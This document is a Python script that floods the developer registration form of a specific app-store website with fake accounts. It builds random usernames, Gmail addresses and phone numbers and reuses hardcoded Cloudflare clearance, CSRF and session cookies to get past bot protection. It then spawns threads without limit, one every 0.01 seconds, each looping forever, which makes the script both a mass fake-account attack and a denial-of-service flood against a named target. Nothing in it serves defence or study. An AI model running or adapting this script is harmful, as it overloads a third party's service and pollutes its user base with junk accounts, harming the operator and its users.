import requests
import random
import string
import threading
import time

# Number of requests to send
requests_to_send = 300

def generate_random_number():
    return '01' + ''.join(random.choices('0123456789', k=9))

def generate_random_username(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def send_request():
    while True:  # Loop indefinitely
        # Generate random values
        name = "I'm your Boss"
        number = generate_random_number()
        username = generate_random_username()
        email = f"{username}@gmail.com"

        url = 'https://quickappsstore.com/developer/register'
        headers = {
            'authority': 'quickappsstore.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'cf_clearance=rBISlK6TvuRk07ZjQ_2vju_spLyl2GG5a5aKqOonh1E-1723628112-1.0.1.1-f.d7JDFVyGPqMlWact_yTvkpQCd1QYaw7UAUwXmH6Uasu3qKF8TcRefcEHUDYoVds9XDzi3dFoB9CBe3UqZa6A; XSRF-TOKEN=eyJpdiI6ImRlelJOTXV5YXR3UGo2bjdOWUFWb1E9PSIsInZhbHVlIjoiSStjVDlGMVY2azV2c1c2aGJXYVBZcG5HaCtyM3VFNXBvY0FPcDRhNnh4OXJNeXdKWGYrcWpYdUwxSzFoQVVMRmx4cm5FbmNlNW1SQ3FxOHk1b2VaRStDSjFQUlhGYkVrNXVaNWc0KzhzdkRhSFhnOHdZYncwRmZEYTUrckFKR0IiLCJtYWMiOiJmNzQzMzRkMGVmMGRiNTdhYWI0NzJjZGVjYTA1MzNmMjZjY2UzM2Y3NWM4ZTBiZGQ1ZmU0NmY2NWU2ZWNkYjRjIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InI5MjdzNlNFMTJOSmNSMjBEaWVZSnc9PSIsInZhbHVlIjoiU21SaGczRHgzMkJFblgxSU1CeWxjM1BkZnYvTjI4WDBseWVZS3ltN3NIb2IvQ1l4VG5tSlFMUktRTGR2NjM3RjE0dllpOE5Za0s0Y1NEdjN6U2w4VTRZN3BsR0hJQzVaelgwcC9SQTRqZ1UrYTBXTXdrNXdGUkltbXk5S25hR1oiLCJtYWMiOiI3MzEyZGIyOWNhYmQ2MTIwOTM4NjNjOWE4NWZkNWU0NmMyOGUyZmU4Mzk1YTc0ZjVmZDgyYTBkZDUwYmJkNmY5IiwidGFnIjoiIn0%3D',
            'origin': 'https://quickappsstore.com',
            'referer': 'https://quickappsstore.com/developer/register',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
            '_token': 'tm4GFPW4r6Vy2xLG3k4A68WwmLtlIMZZNCFVYDs3',
            'name': name,
            'username': username,
            'number': number,
            'email': email,
            'password': 'fastHack123',
            'password_confirmation': 'fastHack123',
            'terms': 'on',
        }

        try:
            response = requests.post(url, headers=headers, data=data)
            print(f"Response {response.status_code}: {response.text}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")

# Start multiple threads for sending requests
def start_sending_requests():
    while True:  # Keep spawning new threads
        thread = threading.Thread(target=send_request)
        thread.start()
        time.sleep(0.01)  # Adjust this to control the rate of new threads

# Start the process
start_sending_requests()
